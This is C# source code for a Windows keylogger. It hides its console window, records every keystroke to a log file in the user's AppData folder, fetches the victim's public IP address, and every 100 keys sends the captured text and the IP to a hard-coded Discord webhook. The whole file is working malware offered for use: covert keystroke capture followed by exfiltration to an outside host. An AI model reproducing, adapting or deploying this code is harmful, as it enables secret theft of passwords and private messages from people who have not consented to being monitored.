using System;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Text;


namespace Keylogger
{
    class Program
    {
        public static int N_KEY = 0; // Number of keys written
        public static int INTERVAL = 100; // Interval before sending discord webhook
        public static readonly string DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1055550829416960020/5XNmr-xCq3an73LZVknB33Ya3cBMQwkL6sJeffNtBYO8iqvwJfUSbD2DlVnbWyK1omKK"; // Discord Webhook Url here
        static async Task Main(string[] args)
        {
            ConsoleExtension.Hide(); // Change to Show() to show the console
            string IP = await GetPublicAddr();

            // Path of the log file
            string logFile = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\logs.txt";

            StreamWriter sw = new StreamWriter(logFile, true);

            while (true)
            {
                if (N_KEY == INTERVAL)
                {
                    sw.Dispose();
                    string content = File.ReadAllText(logFile);
                    await SendContent(content, IP);
                    N_KEY = 0;
                    File.WriteAllText(logFile, "");
                    sw = new StreamWriter(logFile, true);
                }

                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        N_KEY++;
                        string keyName = GetKeyName(key);
                        sw.Write(keyName);
                    }
                }

                sw.Flush();

                Thread.Sleep(10);
            }
            sw.Close();
        }

        private static string GetKeyName(Keys key)
        {
            byte[] keyboardState = new byte[256];
            bool shift = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) == 0x8000;

            if (shift)
            {
                keyboardState[(int)Keys.ShiftKey] = 0xff;
            }

            char[] chars = new char[1];
            int result = NativeMethods.ToUnicode((uint)key, 0, keyboardState, chars, chars.Length, 0);

            if (result == 1)
            {
                return new string(chars);
            }

            switch (key)
            {
                case Keys.Space:
                    return " ";
                case Keys.Enter:
                    return Environment.NewLine;
                case Keys.Tab:
                    return "\t";
                case Keys.Escape:
                    return "[ESC]";
                case Keys.Back:
                    return "[BACK]";
                case Keys.Delete:
                    return "[DEL]";
                case Keys.Left:
                    return "[LEFT]";
                case Keys.Up:
                    return "[UP]";
                case Keys.Right:
                    return "[RIGHT]";
                case Keys.Down:
                    return "[DOWN]";
                default:
                    return "";
            }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Keys vKey);

        internal static class NativeMethods
        {
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out] char[] pwszBuff, int cchBuff, uint wFlags);
        }

        private static async Task<string> GetPublicAddr()
        {
            HttpClient client = new HttpClient();
            var response = await client.GetAsync("https://api.ipify.org");
            return await response.Content.ReadAsStringAsync();
        }

        static async Task SendContent(string des, string ip)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new
                    {
                        embeds = new object[]
                        {
                            new
                            {
                                title = ip,
                                description = des,
                                color = 1234567
                            }
                        }
                    };
                    var json = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    await client.PostAsync(DISCORD_WEBHOOK, content);
                }
            }
            catch
            {
                return; // The machine is not connected to internet
            }
        }
    }
}
